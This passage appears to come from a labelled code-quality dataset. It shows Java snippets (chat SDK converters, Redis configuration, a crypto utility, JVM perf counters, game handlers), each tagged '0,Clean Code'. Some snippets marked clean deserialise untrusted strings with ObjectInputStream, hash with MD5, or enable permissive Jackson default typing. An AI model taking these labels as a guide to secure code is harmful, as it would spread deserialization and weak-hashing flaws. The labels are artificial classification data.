    dataBean.setIconPath(friendInfo.getUserProfile().getFaceUrl());
    return dataBean;
  }
  public static List<SearchDataBean> convertFriendInfos2SearchDataBeans(  List<V2TIMFriendInfoResult> v2TIMFriendInfoResults){
    List<SearchDataBean> searchDataBeanList=new ArrayList<>();
    for (    V2TIMFriendInfoResult v2TIMFriendInfoResult : v2TIMFriendInfoResults) {
      SearchDataBean bean=convertFriendInfo2SearchDataBean(v2TIMFriendInfoResult);
      if (bean == null) {
        continue;
      }
      searchDataBeanList.add(bean);
    }
    return searchDataBeanList;
  }
  public static SearchMessageBean convertSearchResultItem2SearchMessageBean(  V2TIMMessageSearchResultItem v2TIMMessageSearchResultItem){
    if (v2TIMMessageSearchResultItem == null) {
      return null;
    }
    SearchMessageBean searchMessageBean=new SearchMessageBean();
    searchMessageBean.setConversationId(v2TIMMessageSearchResultItem.getConversationID());
    searchMessageBean.setMessageCount(v2TIMMessageSearchResultItem.getMessageCount());
    searchMessageBean.setMessageInfoList(MessageInfoUtil.convertTIMMessages2MessageInfos(v2TIMMessageSearchResultItem.getMessageList()));
    return searchMessageBean;
  }
  public static List<SearchMessageBean> convertSearchResultItems2SearchMessageBeans(  List<V2TIMMessageSearchResultItem> v2TIMMessageSearchResultItems){
    List<SearchMessageBean> searchMessageBeanList=new ArrayList<>();
    for (    V2TIMMessageSearchResultItem v2TIMMessageSearchResultItem : v2TIMMessageSearchResultItems) {
      SearchMessageBean bean=convertSearchResultItem2SearchMessageBean(v2TIMMessageSearchResultItem);
      if (bean == null) {
        continue;
      }
      searchMessageBeanList.add(bean);
    }
    return searchMessageBeanList;
  }
}
",0,Clean Code
"/** 
 * Counter snapshot file.
 * @author boyan (boyan@alibaba-inc.com)2018-Apr-09 5:14:55 PM
 */
public class CounterSnapshotFile {
  private static final Logger LOG=LoggerFactory.getLogger(CounterSnapshotFile.class);
  private String path;
  public CounterSnapshotFile(  String path){
    super();
    this.path=path;
  }
  public String getPath(){
    return this.path;
  }
  /** 
 * Save value to snapshot file.
 */
  public boolean save(  final long value){
    try {
      FileUtils.writeStringToFile(new File(path),String.valueOf(value));
      return true;
    }
 catch (    IOException e) {
      LOG.error(""Fail to save snapshot"",e);
      return false;
    }
  }
  public long load() throws IOException {
    final String s=FileUtils.readFileToString(new File(path));
    if (!StringUtils.isBlank(s)) {
      return Long.parseLong(s);
    }
    throw new IOException(""Fail to load snapshot from "" + path + "",content: ""+ s);
  }
}",0,Clean Code
"@SuperBuilder @ToString @EqualsAndHashCode @Getter @NoArgsConstructor @Schema(title=""Assert some conditions."",description=""Used to control outputs data emitted from previous task on this execution."") @Plugin(examples={@Example(title=""Assert based on inputs data"",full=true,code={""id: assert\n"" + ""namespace: company.team\n"" + ""\n""+ ""inputs:\n""+ ""  - id: param\n""+ ""    type: STRING\n""+ ""    required: true\n""+ ""\n""+ ""tasks:\n""+ ""  - id: fail\\n\"" +\n""+ ""    type: io.kestra.plugin.core.execution.Assert\n""+ ""    conditions:\n""+ ""     - \""{{ inputs.param == 'ok' }}\""\n""+ ""     - \""{{ 1 + 1 == 3 }}\""\n""})},metrics={@Metric(name=""failed"",type=Counter.TYPE),@Metric(name=""success"",type=Counter.TYPE)}) public class Assert extends Task implements RunnableTask<VoidOutput> {
  @Schema(title=""List of assertion condition, must coerce to a boolean."",description=""Boolean coercion allows 0, -0, and '' to coerce to false, all other values to coerce to true."") @NotNull @PluginProperty(dynamic=true) private List<String> conditions;
  @Schema(title=""Optional error message."") private Property<String> errorMessage;
  @Override public VoidOutput run(  RunContext runContext) throws Exception {
    AtomicInteger failed=new AtomicInteger(0);
    AtomicInteger success=new AtomicInteger(0);
    conditions.forEach(s -> {
      try {
        String renderer=runContext.render(s);
        if (TruthUtils.isFalsy(renderer)) {
          runContext.logger().error(""Assertion `{}` failed!"",s,renderer);
          failed.incrementAndGet();
        }
 else {
          success.incrementAndGet();
        }
      }
 catch (      IllegalVariableEvaluationException e) {
        runContext.logger().error(""Assertion `{}` failed, failed to render `{}`"",s,e.getMessage());
        failed.incrementAndGet();
      }
    }
);
    runContext.metric(Counter.of(""success"",success.get()));
    runContext.metric(Counter.of(""failed"",failed.get()));
    if (failed.get() > 0) {
      throw new Exception(failed + "" assertion"" + (failed.get() > 1 ? ""s"" : """")+ "" failed!""+ runContext.render(errorMessage).as(String.class).map(r -> ""\n"" + r).orElse(""""));
    }
    return null;
  }
}
",0,Clean Code
"public class CryptoUtils {
  private CryptoUtils(){
  }
  public static String object2String(  Serializable o){
    try {
      ByteArrayOutputStream bos=new ByteArrayOutputStream();
      ObjectOutputStream oos=new ObjectOutputStream(bos);
      oos.writeObject(o);
      oos.flush();
      oos.close();
      bos.close();
      return new String((new Base64()).encode(bos.toByteArray()));
    }
 catch (    Exception var3) {
      throw new RuntimeException(var3);
    }
  }
  public static Object string2Object(  String str){
    try {
      ByteArrayInputStream bis=new ByteArrayInputStream((new Base64()).decode(str.getBytes()));
      ObjectInputStream ois=new ObjectInputStream(bis);
      Object o=ois.readObject();
      bis.close();
      ois.close();
      return o;
    }
 catch (    Exception var4) {
      throw new RuntimeException(var4);
    }
  }
  public static String md5(  String source,  String salt,  int iterator){
    StringBuilder token=new StringBuilder();
    try {
      MessageDigest digest=MessageDigest.getInstance(""md5"");
      if (StringUtils.isNotEmpty(salt)) {
        digest.update(salt.getBytes(""UTF-8""));
      }
      byte[] result=digest.digest(source.getBytes());
      for (int i=0; i < iterator - 1; ++i) {
        digest.reset();
        result=digest.digest(result);
      }
      byte[] var12=result;
      int var7=result.length;
      for (int var8=0; var8 < var7; ++var8) {
        byte aResult=var12[var8];
        int temp=aResult & 255;
        if (temp <= 15) {
          token.append(""0"");
        }
        token.append(Integer.toHexString(temp));
      }
      return token.toString();
    }
 catch (    Exception var11) {
      throw new RuntimeException(var11.getMessage());
    }
  }
}
",0,Clean Code
"/** 
 * An abstraction for a native string array data type ( {@code char**}). 
 */
@SuppressWarnings(""checkstyle:EqualsHashCode"") final class StringArray extends Memory {
  private static final Charset ENCODING=Native.DEFAULT_CHARSET;
  private static final ObjectPool<StringArray> POOL=new ObjectPool<>(null,null);
  /** 
 * Hold all  {@code NativeString}, avoid be GCed. 
 */
  private List<NativeString> natives;
  private int length;
  /** 
 * Create a native array of strings.
 * @param strings the strings
 */
  private StringArray(  String[] strings){
    super((strings.length + 1) * Native.POINTER_SIZE);
    natives=new ArrayList<>();
    length=strings.length;
    setPointers(strings);
  }
  private void setPointers(  String[] strings){
    for (    NativeString ns : natives) {
      ns.recycle();
    }
    natives.clear();
    for (int i=0; i < strings.length; i++) {
      Pointer p=null;
      if (strings[i] != null) {
        NativeString ns=NativeString.of(strings[i],ENCODING);
        natives.add(ns);
        p=ns.getPointer();
      }
      setPointer(Native.POINTER_SIZE * i,p);
    }
    setPointer(Native.POINTER_SIZE * strings.length,null);
  }
  /** 
 * Acquires a pooled  {@code StringArray} object if available, otherwise a new instance iscreated.
 * @param strings the pointers to include in the array
 * @return a {@code StringArray} object
 */
  public static StringArray of(  String[] strings){
    StringArray array=POOL.acquire();
    if (array != null && array.length >= strings.length) {
      array.setPointers(strings);
      return array;
    }
    return new StringArray(strings);
  }
  /** 
 * Recycles this instance and return it back to the pool. 
 */
  public void recycle(){
    POOL.recycle(this);
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public boolean equals(  Object o){
    return this == o;
  }
}
",0,Clean Code
"public class TUIEmojiLog extends IMLog {
  private static final String PRE=""TUIEmojiLog-"";
  private static String mixTag(  String tag){
    return PRE + tag;
  }
  /** 
 * Print INFO level log
 * @param strTag  TAG
 * @param strInfo 
 */
  public static void v(  String strTag,  String strInfo){
    IMLog.v(mixTag(strTag),strInfo);
  }
  /** 
 * Print DEBUG level log
 * @param strTag  TAG
 * @param strInfo 
 */
  public static void d(  String strTag,  String strInfo){
    IMLog.d(mixTag(strTag),strInfo);
  }
  /** 
 * Print INFO level log
 * @param strTag  TAG
 * @param strInfo 
 */
  public static void i(  String strTag,  String strInfo){
    IMLog.i(mixTag(strTag),strInfo);
  }
  /** 
 * Print WARN level log
 * @param strTag  TAG
 * @param strInfo 
 */
  public static void w(  String strTag,  String strInfo){
    IMLog.w(mixTag(strTag),strInfo);
  }
  /** 
 * Print WARN level log
 * @param strTag  TAG
 * @param strInfo 
 */
  public static void w(  String strTag,  String strInfo,  Throwable e){
    IMLog.w(mixTag(strTag),strInfo + e.getMessage());
  }
  /** 
 * Print ERROR level log
 * @param strTag  TAG
 * @param strInfo 
 */
  public static void e(  String strTag,  String strInfo){
    IMLog.e(mixTag(strTag),strInfo);
  }
}
",0,Clean Code
"private class ConferenceListObserver extends TUIConferenceListManager.Observer {
  @Override public void onConferenceScheduled(  TUIConferenceListManager.ConferenceInfo conferenceInfo){
    Log.d(TAG,""onConferenceScheduled conferenceId="" + conferenceInfo.basicRoomInfo.roomId);
    mConferenceListState.scheduledConferences.insert(new ConferenceListState.ConferenceInfo(conferenceInfo),mScheduledConferenceComparator);
  }
  @Override public void onConferenceWillStart(  TUIConferenceListManager.ConferenceInfo conferenceInfo){
    Log.d(TAG,""onConferenceWillStart conferenceId="" + conferenceInfo.basicRoomInfo.roomId);
  }
  @Override public void onConferenceCancelled(  String conferenceId,  TUIConferenceListManager.ConferenceCancelReason reason,  TUIRoomDefine.UserInfo operateUser){
    Log.d(TAG,""onConferenceCancelled conferenceId="" + conferenceId);
    mConferenceListState.scheduledConferences.remove(new ConferenceListState.ConferenceInfo(conferenceId));
  }
  @Override public void onConferenceInfoChanged(  TUIConferenceListManager.ConferenceInfo conferenceInfo,  List<TUIConferenceListManager.ConferenceModifyFlag> modifyFlagList){
    Log.d(TAG,""onConferenceInfoChanged conferenceId="" + conferenceInfo.basicRoomInfo.roomId);
    ConferenceListState.ConferenceInfo newInfo=new ConferenceListState.ConferenceInfo(conferenceInfo);
    ConferenceListState.ConferenceInfo oldInfo=mConferenceListState.scheduledConferences.find(newInfo);
    if (oldInfo == null) {
      mConferenceListState.scheduledConferences.insert(newInfo,mScheduledConferenceComparator);
      return;
    }
    oldInfo.update(conferenceInfo);
    mConferenceListState.scheduledConferences.change(oldInfo);
    mConferenceListState.scheduledConferences.move(oldInfo,mScheduledConferenceComparator);
  }
  @Override public void onScheduleAttendeesChanged(  String roomId,  List<TUIRoomDefine.UserInfo> leftUsers,  List<TUIRoomDefine.UserInfo> joinedUsers){
    ConferenceListState.ConferenceInfo conferenceInfo=mConferenceListState.scheduledConferences.find(new ConferenceListState.ConferenceInfo(roomId));
    if (conferenceInfo == null) {
      return;
    }
    for (    TUIRoomDefine.UserInfo item : leftUsers) {
      conferenceInfo.hadScheduledAttendees.remove(new UserState.UserInfo(item.userId));
    }
    for (    TUIRoomDefine.UserInfo item : joinedUsers) {
      conferenceInfo.hadScheduledAttendees.add(new UserState.UserInfo(item));
    }
  }
  @Override public void onConferenceStatusChanged(  String roomId,  TUIConferenceListManager.ConferenceStatus status){
    ConferenceListState.ConferenceInfo conferenceInfo=mConferenceListState.scheduledConferences.find(new ConferenceListState.ConferenceInfo(roomId));
    if (conferenceInfo == null) {
      return;
    }
    conferenceInfo.status=status;
    mConferenceListState.scheduledConferences.change(conferenceInfo);
  }
}
",0,Clean Code
"/** 
 * Java类型入口回放器；在sandbox两种挂载模式下工作条件不同（因为无法获取到运行实例） <p> agent启动 ：能够回放spring容器中的任何bean实例 <p> attach启动：需要引入repeater-client并在spring中注入 {@code SpringContextAware}or 兜底逻辑会使用 {@link JavaInstanceCache} 进行实例获取<p>
 * @author zhaoyb1990
 */
@MetaInfServices(Repeater.class) public class JavaRepeater extends AbstractRepeater {
  @Override protected Object executeRepeat(  RepeatContext context) throws Exception {
    Invocation invocation=context.getRecordModel().getEntranceInvocation();
    if (!getType().equals(invocation.getType())) {
      throw new RepeatException(""invoke type miss match, required invoke type is: "" + invocation.getType());
    }
    Identity identity=invocation.getIdentity();
    Object bean=SpringContextAdapter.getBeanByType(identity.getLocation());
    if (bean == null) {
      bean=JavaInstanceCache.getInstance(identity.getLocation());
    }
    if (bean == null) {
      throw new RepeatException(""no bean found in context, className="" + identity.getLocation());
    }
    String[] array=identity.getEndpoint().split(""~"");
    String methodName=array[0].substring(1);
    ClassLoader classLoader=ClassloaderBridge.instance().decode(invocation.getSerializeToken());
    if (classLoader == null) {
      classLoader=ClassLoader.getSystemClassLoader();
    }
    MethodSignatureParser.MethodSpec methodSpec=MethodSignatureParser.parseIdentifier(array[1]);
    Class<?>[] parameterTypes=MethodSignatureParser.loadClass(methodSpec.getParamIdentifiers(),classLoader);
    Method method=bean.getClass().getDeclaredMethod(methodName,parameterTypes);
    return method.invoke(bean,invocation.getRequest());
  }
  @Override public InvokeType getType(){
    return InvokeType.JAVA;
  }
  @Override public String identity(){
    return ""java"";
  }
}
",0,Clean Code
"/** 
 * 谁在场指令处理器
 */
public class WhoElseIsHereCmdHandler implements ICmdHandler<GameMsgProtocol.WhoElseIsHereCmd> {
  @Override public void handle(  ChannelHandlerContext ctx,  GameMsgProtocol.WhoElseIsHereCmd msg){
    GameMsgProtocol.WhoElseIsHereResult.Builder resultBuilder=GameMsgProtocol.WhoElseIsHereResult.newBuilder();
    for (    User currUser : UserManager.listUser()) {
      if (null == currUser) {
        continue;
      }
      GameMsgProtocol.WhoElseIsHereResult.UserInfo.Builder userInfoBuilder=GameMsgProtocol.WhoElseIsHereResult.UserInfo.newBuilder();
      userInfoBuilder.setUserId(currUser.userId);
      userInfoBuilder.setHeroAvatar(currUser.heroAvatar);
      resultBuilder.addUserInfo(userInfoBuilder);
    }
    GameMsgProtocol.WhoElseIsHereResult newResult=resultBuilder.build();
    ctx.writeAndFlush(newResult);
  }
}
/** 
 * 谁在场指令处理器
 */
public class WhoElseIsHereCmdHandler implements ICmdHandler<GameMsgProtocol.WhoElseIsHereCmd> {
  @Override public void handle(  ChannelHandlerContext ctx,  GameMsgProtocol.WhoElseIsHereCmd cmd){
    if (null == ctx || null == cmd) {
      return;
    }
    GameMsgProtocol.WhoElseIsHereResult.Builder resultBuilder=GameMsgProtocol.WhoElseIsHereResult.newBuilder();
    for (    User currUser : UserManager.listUser()) {
      if (null == currUser) {
        continue;
      }
      GameMsgProtocol.WhoElseIsHereResult.UserInfo.Builder userInfoBuilder=GameMsgProtocol.WhoElseIsHereResult.UserInfo.newBuilder();
      userInfoBuilder.setUserId(currUser.userId);
      userInfoBuilder.setHeroAvatar(currUser.heroAvatar);
      resultBuilder.addUserInfo(userInfoBuilder);
    }
    GameMsgProtocol.WhoElseIsHereResult newResult=resultBuilder.build();
    ctx.writeAndFlush(newResult);
  }
}
",0,Clean Code
"public abstract class ConversationExt {
  protected FragmentActivity activity;
  protected ConversationExtension extension;
  protected Fragment fragment;
  private int index;
  protected Conversation conversation;
  private String targetUser;
  protected MessageViewModel messageViewModel;
  /** 
 * ext 优先级
 * @return
 */
  public abstract int priority();
  /** 
 * ext icon资源id
 * @return
 */
  public abstract int iconResId();
  /** 
 * ext 标题
 * @param context
 * @return
 */
  public abstract String title(  Context context);
  /** 
 * 长按Ext，弹出的 context menu 的标题
 * @param tag
 * @return
 */
  public abstract String contextMenuTitle(  Context context,  String tag);
  /** 
 * 当前会话是否显示此扩展
 * @param conversation
 * @return 返回true，表示不显示
 */
  public boolean filter(  Conversation conversation){
    return false;
  }
  /** 
 * 和会话界面绑定之后调用
 * @param fragment
 */
  protected void onBind(  Fragment fragment,  MessageViewModel messageViewModel,  Conversation conversation,  String targetUser,  ConversationExtension conversationExtension,  int index){
    this.activity=fragment.getActivity();
    this.fragment=fragment;
    this.messageViewModel=messageViewModel;
    this.conversation=conversation;
    this.targetUser=targetUser;
    this.extension=conversationExtension;
    this.index=index;
  }
  protected void onDestroy(){
    this.activity=null;
    this.fragment=null;
    this.messageViewModel=null;
    this.conversation=null;
    this.targetUser=null;
    this.extension=null;
  }
  protected final void startActivity(  Intent intent){
    activity.startActivity(intent);
  }
  /** 
 * @param requestCode
 * @param resultCode
 * @param data
 */
  protected void onActivityResult(  int requestCode,  int resultCode,  Intent data){
    throw new IllegalStateException(""show override this method"");
  }
  /** 
 * @param intent
 * @param requestCode 必须在0-256范围之内, 扩展{@link ConversationExt}内部唯一即可
 */
  protected final void startActivityForResult(  Intent intent,  int requestCode){
    if (requestCode < 0 || requestCode > 256) {
      throw new IllegalArgumentException(""request code should in [0, 256]"");
    }
    extension.startActivityForResult(intent,requestCode,index);
  }
  public String[] checkPermissions(  @NonNull String[] permissions){
    List<String> notGrantedPermissions=new ArrayList<>();
    for (    String permission : permissions) {
      if (activity.checkCallingOrSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) {
        notGrantedPermissions.add(permission);
      }
    }
    return notGrantedPermissions.toArray(new String[0]);
  }
  protected List<String> toUsers(){
    if (TextUtils.isEmpty(this.targetUser)) {
      return null;
    }
    return Collections.singletonList(this.targetUser);
  }
}
",0,Clean Code
"@ConditionalOnClass(RedisOperations.class) public class RedisConfig {
  /** 
 * 自定义redis序列化的机制,重新定义一个ObjectMapper.防止和MVC的冲突
 * @return
 */
  @Bean public RedisSerializer<Object> redisSerializer(){
    ObjectMapper objectMapper=new ObjectMapper();
    objectMapper.setSerializationInclusion(JsonInclude.Include.NON_NULL);
    objectMapper.setVisibility(PropertyAccessor.ALL,JsonAutoDetect.Visibility.ANY);
    objectMapper.configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES,false);
    objectMapper.configure(SerializationFeature.FAIL_ON_EMPTY_BEANS,false);
    objectMapper.configure(DeserializationFeature.FAIL_ON_INVALID_SUBTYPE,false);
    objectMapper.configure(SerializationFeature.WRITE_DATE_KEYS_AS_TIMESTAMPS,false);
    objectMapper.registerModule(new JavaTimeModule());
    objectMapper.activateDefaultTyping(LaissezFaireSubTypeValidator.instance,ObjectMapper.DefaultTyping.NON_FINAL,JsonTypeInfo.As.PROPERTY);
    GenericJackson2JsonRedisSerializer.registerNullValueSerializer(objectMapper,null);
    return new GenericJackson2JsonRedisSerializer(objectMapper);
  }
  /** 
 * 实例化 RedisTemplate 对象
 * @return
 */
  @Bean(name=""redisTemplate"") public RedisTemplate<String,Object> redisTemplate(  RedisConnectionFactory redisConnectionFactory,  RedisSerializer<Object> redisSerializer){
    RedisTemplate<String,Object> redisTemplate=new RedisTemplate<>();
    redisTemplate.setConnectionFactory(redisConnectionFactory);
    redisTemplate.setDefaultSerializer(redisSerializer);
    redisTemplate.setValueSerializer(redisSerializer);
    redisTemplate.setHashValueSerializer(redisSerializer);
    redisTemplate.setKeySerializer(StringRedisSerializer.UTF_8);
    redisTemplate.setHashKeySerializer(StringRedisSerializer.UTF_8);
    redisTemplate.afterPropertiesSet();
    return redisTemplate;
  }
  @Bean @ConditionalOnBean(name=""redisTemplate"") public RedisService redisService(){
    return new RedisService();
  }
  @Bean @ConditionalOnBean(name=""redisTemplate"") public DistributedLock distributedLock(){
    return new DistributedLock();
  }
}",0,Clean Code
"/** 
 * @author leix.xie
 * @date 2019/9/19 16:15
 * @describe
 */
public class PerfData {
  private static final Logger logger=LoggerFactory.getLogger(PerfData.class);
  public static long NANOS_TO_MILLS=1000 * 1000;
  private static final Object PERF_INSTANCE;
  private static final Method ATTACH_METHOD;
static {
    try {
      Class<?> perfClass;
      if (JavaVersionUtils.isLessThanJava9()) {
        perfClass=Class.forName(""sun.misc.Perf"");
      }
 else {
        perfClass=Class.forName(""jdk.internal.perf.Perf"");
      }
      Method getPerfMethod=perfClass.getMethod(""getPerf"");
      PERF_INSTANCE=getPerfMethod.invoke(null);
      ATTACH_METHOD=perfClass.getMethod(""attach"",int.class,String.class);
    }
 catch (    ClassNotFoundException e) {
      logger.error(""reflect perf class error"",e);
      throw new RuntimeException(e);
    }
catch (    Exception e) {
      logger.error(""pref instance init error"",e);
      throw new RuntimeException(e);
    }
  }
  private final PerfInstrumentation instr;
  private final double nanosPerTick;
  private final Map<String,Counter> counters;
  public static PerfData connect(  int pid){
    try {
      return new PerfData(pid);
    }
 catch (    ThreadDeath|OutOfMemoryError e) {
      throw e;
    }
catch (    Throwable e) {
      throw new RuntimeException(""Cannot perf data for process "" + pid,e);
    }
  }
  private PerfData(  int pid) throws IOException, InvocationTargetException, IllegalAccessException {
    ByteBuffer bb=(ByteBuffer)ATTACH_METHOD.invoke(PERF_INSTANCE,pid,""r"");
    instr=new PerfInstrumentation(bb);
    counters=buildAllCounters();
    long hz=(Long)counters.get(""sun.os.hrt.frequency"").getValue();
    nanosPerTick=((double)TimeUnit.SECONDS.toNanos(1)) / hz;
  }
  private Map<String,Counter> buildAllCounters(){
    Map<String,Counter> result=new HashMap<>(512);
    for (    Counter c : instr.getAllCounters()) {
      result.put(c.getName(),c);
    }
    return result;
  }
  public Map<String,Counter> getAllCounters(){
    return counters;
  }
  public Counter findCounter(  String counterName){
    return counters.get(counterName);
  }
  public long tickToMills(  LongCounter tickCounter){
    if (tickCounter.getUnits() == sun.management.counter.Units.TICKS) {
      return (long)((nanosPerTick * tickCounter.longValue()) / NANOS_TO_MILLS);
    }
 else {
      throw new IllegalArgumentException(tickCounter.getName() + "" is not a ticket counter"");
    }
  }
}
",0,Clean Code
"public class ArgumentBlockState extends Argument<Block> {
  public static final int NO_BLOCK=1;
  public static final int INVALID_BLOCK=2;
  public static final int INVALID_PROPERTY=3;
  public static final int INVALID_PROPERTY_VALUE=4;
  public ArgumentBlockState(  @NotNull String id){
    super(id,true,false);
  }
  @Override public @NotNull Block parse(  @NotNull CommandSender sender,  @NotNull String input) throws ArgumentSyntaxException {
    return staticParse(input);
  }
  @Override public @NotNull ArgumentParserType parser(){
    return ArgumentParserType.BLOCK_STATE;
  }
  /** 
 * @deprecated use {@link Argument#parse(CommandSender,Argument)}
 */
  @Deprecated public static Block staticParse(  @NotNull String input) throws ArgumentSyntaxException {
    final int nbtIndex=input.indexOf(""["");
    if (nbtIndex == 0)     throw new ArgumentSyntaxException(""No block type"",input,NO_BLOCK);
    if (nbtIndex == -1) {
      final Block block=Block.fromNamespaceId(input);
      if (block == null)       throw new ArgumentSyntaxException(""Invalid block type"",input,INVALID_BLOCK);
      return block;
    }
 else {
      if (!input.endsWith(""]""))       throw new ArgumentSyntaxException(""Property list need to end with ]"",input,INVALID_PROPERTY);
      final String blockName=input.substring(0,nbtIndex);
      Block block=Block.fromNamespaceId(blockName);
      if (block == null)       throw new ArgumentSyntaxException(""Invalid block type"",input,INVALID_BLOCK);
      final String query=input.substring(nbtIndex);
      final var propertyMap=BlockUtils.parseProperties(query);
      try {
        return block.withProperties(propertyMap);
      }
 catch (      IllegalArgumentException e) {
        throw new ArgumentSyntaxException(""Invalid property values"",input,INVALID_PROPERTY_VALUE);
      }
    }
  }
  @Override public String toString(){
    return String.format(""BlockState<%s>"",getId());
  }
}
",0,Clean Code
"public class TopView extends FrameLayout implements View.OnClickListener {
  private Context mContext;
  private LinearLayout mButtonExit;
  private RelativeLayout mLayoutMeetingInfo;
  public TopView(  Context context){
    super(context);
    mContext=context;
    initView(this);
  }
  private void initView(  final View itemView){
    inflate(mContext,R.layout.tuiroomkit_view_top,this);
    mLayoutMeetingInfo=findViewById(R.id.rl_meeting_info);
    mLayoutMeetingInfo.setOnClickListener(this);
    mButtonExit=itemView.findViewById(R.id.btn_exit_room);
    mButtonExit.setOnClickListener(this);
  }
  @Override public void setVisibility(  int visibility){
    int animResId=visibility == VISIBLE ? R.anim.tuiroomkit_anim_top_view_show : R.anim.tuiroomkit_anim_top_view_dismiss;
    startAnimation(AnimationUtils.loadAnimation(getContext(),animResId));
    super.setVisibility(visibility);
  }
  @Override public void onClick(  View v){
    if (v.getId() == R.id.rl_meeting_info) {
      RoomInfoDialog roomInfoView=new RoomInfoDialog(mContext);
      roomInfoView.show();
    }
 else     if (v.getId() == R.id.btn_exit_room) {
      ConferenceEventCenter.getInstance().notifyUIEvent(ConferenceEventCenter.RoomKitUIEvent.SHOW_EXIT_ROOM_VIEW,null);
    }
    ConferenceEventCenter.getInstance().notifyUIEvent(BAR_SHOW_TIME_RECOUNT,null);
  }
}
",0,Clean Code
"public class UploadFileRequestBody extends RequestBody {
  protected RequestBody mDelegate;
  protected Listener mListener;
  protected CountingSink mCountingSink;
  public UploadFileRequestBody(  RequestBody delegate,  Listener listener){
    mDelegate=delegate;
    mListener=listener;
  }
  @Override public MediaType contentType(){
    return mDelegate.contentType();
  }
  @Override public long contentLength(){
    try {
      return mDelegate.contentLength();
    }
 catch (    IOException e) {
      e.printStackTrace();
    }
    return -1;
  }
  @Override public void writeTo(  BufferedSink sink) throws IOException {
    mCountingSink=new CountingSink(sink);
    BufferedSink bufferedSink=Okio.buffer(mCountingSink);
    mDelegate.writeTo(bufferedSink);
    bufferedSink.flush();
  }
protected final class CountingSink extends ForwardingSink {
    private long bytesWritten=0;
    public CountingSink(    Sink delegate){
      super(delegate);
    }
    @Override public void write(    Buffer source,    long byteCount) throws IOException {
      super.write(source,byteCount);
      bytesWritten+=byteCount;
      if (contentLength() > 0) {
        mListener.onProgress(bytesWritten,contentLength());
      }
    }
  }
public interface Listener {
    void onProgress(    long progress,    long total);
  }
}
",0,Clean Code
"/** 
 * A hash map, that is concurrent, weak-key, and identity-hashing.
 */
static final class ConcurrentWeakIdentityHashMap {
  private final ConcurrentHashMap<WeakKey,List<Throwable>> map=new ConcurrentHashMap<>(16,0.75f,10);
  private final ReferenceQueue<Throwable> referenceQueue=new ReferenceQueue<>();
  /** 
 * @param throwable,      the key to retrieve or create associated list.
 * @param createOnAbsence {@code true} to create a new list if there is no value for the key.
 * @return the associated value with the given {@code throwable}. If  {@code createOnAbsence} is{@code true}, the returned value will be non-null. Otherwise, it can be  {@code null}
 */
  public List<Throwable> get(  Throwable throwable,  boolean createOnAbsence){
    deleteEmptyKeys();
    WeakKey keyForQuery=new WeakKey(throwable,null);
    List<Throwable> list=map.get(keyForQuery);
    if (!createOnAbsence) {
      return list;
    }
    if (list != null) {
      return list;
    }
    List<Throwable> newValue=new Vector<>(2);
    list=map.putIfAbsent(new WeakKey(throwable,referenceQueue),newValue);
    return list == null ? newValue : list;
  }
  /** 
 * For testing-purpose
 */
  int size(){
    return map.size();
  }
  void deleteEmptyKeys(){
    for (Reference<?> key=referenceQueue.poll(); key != null; key=referenceQueue.poll()) {
      map.remove(key);
    }
  }
private static final class WeakKey extends WeakReference<Throwable> {
    /** 
 * The hash code is used later to retrieve the entry, of which the key is the current weak key. If the referent is marked for garbage collection and is set to null, we are still able to locate the entry.
 */
    private final int hash;
    public WeakKey(    Throwable referent,    ReferenceQueue<Throwable> q){
      super(referent,q);
      if (referent == null) {
        throw new NullPointerException(""The referent cannot be null"");
      }
      hash=System.identityHashCode(referent);
    }
    @Override public int hashCode(){
      return hash;
    }
    @Override public boolean equals(    Object obj){
      if (obj == null || obj.getClass() != getClass()) {
        return false;
      }
      if (this == obj) {
        return true;
      }
      WeakKey other=(WeakKey)obj;
      return this.hash == other.hash && this.get() == other.get();
    }
  }
}
",0,Clean Code
"/** 
 * 测试并发异常
 * @author L.cm
 */
class DateFormatTest {
  private static String dateStr=""2018-06-22T10:00:00"";
  private static String pattern=""yyyy-MM-dd'T'HH:mm:ss"";
  private static SimpleDateFormat DATE_FORMAT=new SimpleDateFormat(pattern);
  @Test void test1() throws InterruptedException {
    Set<String> dateSet=new TreeSet<>();
    ExecutorService executorService=Executors.newFixedThreadPool(10);
    Runnable task=Unchecked.runnable(() -> {
      String date=parseDate1(dateStr);
      dateSet.add(date);
    }
);
    for (int i=0; i < 100; i++) {
      executorService.submit(task);
    }
    executorService.awaitTermination(100,TimeUnit.MILLISECONDS);
    Assertions.assertEquals(1,dateSet.size());
  }
  @Test void test2() throws InterruptedException {
    Set<String> dateSet=new TreeSet<>();
    ExecutorService executorService=Executors.newFixedThreadPool(10);
    Runnable task=Unchecked.runnable(() -> {
      String date=parseDate2(dateStr);
      dateSet.add(date);
    }
);
    for (int i=0; i < 100; i++) {
      executorService.submit(task);
    }
    executorService.awaitTermination(100,TimeUnit.MILLISECONDS);
    Assertions.assertTrue(dateSet.size() > 0);
  }
  private static String parseDate1(  String dateStr){
    Date date=DateUtil.parse(dateStr,pattern);
    return DateUtil.format(date,pattern);
  }
  private static String parseDate2(  String dateStr) throws ParseException {
    Date date=DATE_FORMAT.parse(dateStr);
    return DateUtil.format(date,pattern);
  }
}
",0,Clean Code
"/** 
 * Internal connection to a server.  The default connection is based on java.net
 */
public interface HessianConnection {
  /** 
 * Adds HTTP headers.
 */
  public void addHeader(  String key,  String value);
  /** 
 * Returns the output stream for the request.
 */
  public OutputStream getOutputStream() throws IOException ;
  /** 
 * Sends the query
 */
  public void sendRequest() throws IOException ;
  /** 
 * Returns the status code.
 */
  public int getStatusCode();
  /** 
 * Returns the status string.
 */
  public String getStatusMessage();
  /** 
 * Returns the content encoding
 */
  public String getContentEncoding();
  /** 
 * Returns the InputStream to the result
 */
  public InputStream getInputStream() throws IOException ;
  /** 
 * Close/free the connection. If keepalive is allowed, it may be used.
 */
  public void close() throws IOException ;
  /** 
 * Shut the connection down.
 */
  public void destroy() throws IOException ;
}
",0,Clean Code
"public class CampfireHandler implements BlockHandler {
  public static final Tag<List<ItemStack>> ITEMS=Tag.View(new TagSerializer<>(){
    private final Tag<BinaryTag> internal=Tag.NBT(""Items"");
    @Override public @Nullable List<ItemStack> read(    @NotNull TagReadable reader){
      ListBinaryTag item=(ListBinaryTag)reader.getTag(internal);
      if (item == null)       return null;
      List<ItemStack> result=new ArrayList<>();
      item.forEach(childTag -> {
        CompoundBinaryTag nbtCompound=(CompoundBinaryTag)childTag;
        int amount=nbtCompound.getByte(""Count"");
        String id=nbtCompound.getString(""id"");
        Material material=Material.fromNamespaceId(id);
